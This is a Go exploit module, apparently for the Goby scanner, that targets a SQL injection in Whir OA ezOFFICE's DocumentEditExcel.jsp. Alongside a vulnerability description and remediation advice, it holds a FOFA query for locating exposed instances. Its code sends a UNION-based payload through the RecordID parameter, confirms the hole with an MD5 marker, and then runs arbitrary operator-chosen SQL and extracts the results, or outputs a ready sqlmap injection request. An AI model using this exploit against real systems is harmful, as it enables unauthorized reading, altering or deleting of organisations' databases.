package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Whir OA /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp SQL Injection Vulnerability",
    "Description": "<p>Whir Software Network is widely recognized as an expert in smart government affairs office in the industry. It is the leading unit for the compilation of national industry standards for OA systems and the leading unit for the compilation of national industry standards for collaborative software. It has focused on the field of collaborative management for 22 years. It provides you with customized integrated office solutions for smart government affairs. </p><p>There is an SQL injection vulnerability in the Whir OA - ezOFFICE DocumentEditExcel.jsp interface. Through this vulnerability, data in the database can be viewed, modified, or even deleted, threatening the security of the system.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "http://www.whir.net/",
    "DisclosureDate": "2023-12-12",
    "PostTime": "2024-08-06",
    "Author": "hhh3156",
    "FofaQuery": "body=\"/defaultroot/scripts/\" && (body=\"/defaultroot/template/css/\" || body=\"/defaultroot/js/cookie.js\" || body=\"/defaultroot/sp/login.jsp\")",
    "GobyQuery": "body=\"/defaultroot/scripts/\" && (body=\"/defaultroot/template/css/\" || body=\"/defaultroot/js/cookie.js\" || body=\"/defaultroot/sp/login.jsp\")",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability in the Whir OA - ezOFFICE DocumentEditExcel.jsp interface. Through this vulnerability, data in the database can be viewed, modified, or even deleted, threatening the security of the system.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "(SELECT (db_name()))",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "万户OA /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp SQL 注入漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户软件网络是业内普遍认可的智慧政务办公专家,OA系统国家行业标准编制组长单位,协同软件国家行业标准编制组长单位,22年专注协同管理领域.为您提供定制化的智慧政务一体化办公解决方案。<br></p><p>万户OA-ezOFFICE DocumentEditExcel.jsp 接口存在一个 SQL 注入漏洞，通过这个漏洞可以查看、修改甚至删除数据库中的数据，威胁系统的安全性。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>万户OA-ezOFFICE&nbsp;DocumentEditExcel.jsp&nbsp;接口存在一个 SQL 注入漏洞，通过这个漏洞可以查看、修改甚至删除数据库中的数据，威胁系统的安全性。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Whir OA /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp SQL Injection Vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Whir Software Network is widely recognized as an expert in smart government affairs office in the industry. It is the leading unit for the compilation of national industry standards for OA systems and the leading unit for the compilation of national industry standards for collaborative software. It has focused on the field of collaborative management for 22 years. It provides you with customized integrated office solutions for smart government affairs.&nbsp;</p><p>There is an SQL injection vulnerability in the Whir OA - ezOFFICE DocumentEditExcel.jsp interface. Through this vulnerability, data in the database can be viewed, modified, or even deleted, threatening the security of the system.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the Whir OA - ezOFFICE DocumentEditExcel.jsp interface. Through this vulnerability, data in the database can be viewed, modified, or even deleted, threatening the security of the system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9924"
}`

	setSqlPayloadHash_PALvowja96fLMAav021M := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		urlget := `/defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID='%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C(` + url.QueryEscape(sql) + `)%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20`

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Referer":    hostInfo.FixedHostInfo,
		}
		resp, err = setGetRequest(hostInfo, urlget, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = urlget

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			randomString := goutils.RandomHexString(8)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `(SELECT (sys.fn_sqlvarbasetostr(HASHBYTES('MD5',CONVERT(varCHAR(8),'` + randomString + `')))))`

			sendPayload := setSqlPayloadHash_PALvowja96fLMAav021M

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID='%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C(select%20(sys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2CCONVERT(varCHAR(8)%2C'12345')))))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20 HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\n"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `webform.WebOffice.FileType="([\s\S]*?)";`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_PALvowja96fLMAav021M
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
